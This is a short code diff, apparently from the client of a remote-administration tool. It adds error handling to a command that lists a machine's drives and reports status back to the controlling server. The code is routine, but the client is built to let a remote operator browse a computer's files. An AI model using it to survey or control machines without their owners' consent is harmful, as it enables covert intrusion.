@@ -18,14 +18,41 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetDrives(Packets.ServerPackets.GetDrives command, Client client)
         {
-            var drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
-            if (drives.Length == 0) return;
+            DriveInfo[] drives;
+            try
+            {
+                drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
+            }
+            catch (IOException)
+            {
+                new Packets.ClientPackets.SetStatusFileManager("GetDrives: I/O error", false).Execute(client);
+                return;
+            }
+            catch (UnauthorizedAccessException)
+            {
+                new Packets.ClientPackets.SetStatusFileManager("GetDrives: No permission", false).Execute(client);
+                return;
+            }
+
+            if (drives.Length == 0)
+            {
+                new Packets.ClientPackets.SetStatusFileManager("GetDrives: No drives", false).Execute(client);
+                return;
+            }
 
             string[] displayName = new string[drives.Length];
             string[] rootDirectory = new string[drives.Length];
             for (int i = 0; i < drives.Length; i++)
             {
-                var volumeLabel = drives[i].VolumeLabel;
+                string volumeLabel = null;
+                try
+                {
+                    volumeLabel = drives[i].VolumeLabel;
+                }
+                catch
+                {
+                }
+
                 if (string.IsNullOrEmpty(volumeLabel))
                 {
                     displayName[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
